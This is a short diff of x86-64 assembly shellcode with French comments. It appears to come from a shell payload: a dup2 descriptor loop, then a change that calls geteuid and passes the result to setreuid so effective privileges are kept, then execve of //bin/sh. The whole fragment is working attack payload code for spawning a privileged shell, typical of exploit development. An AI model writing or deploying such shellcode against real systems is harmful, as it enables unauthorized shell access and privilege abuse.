@@ -43,12 +43,18 @@ _start:
 	   dec sil		; on decremente le 2nd argument
 	   jns dup_loop		; si SF (sil > -1) n'est pas en position, on reboucle
 
+	; geteuid()
+	xor eax,eax
+	mov al,0x6b
+	syscall
 
-; NON AUTORISE NATIVEMENT	; setreuid(0,0)
+	; setreuid(geteuid(),geteuid())
+	push rax
+	pop rdi
+	push rax
+	pop rsi
 	push BYTE 0x71
 	pop rax
-	xor edi,edi
-	xor esi,esi
 	syscall
 
 	; execve('//bin/sh', NULL, NULL)
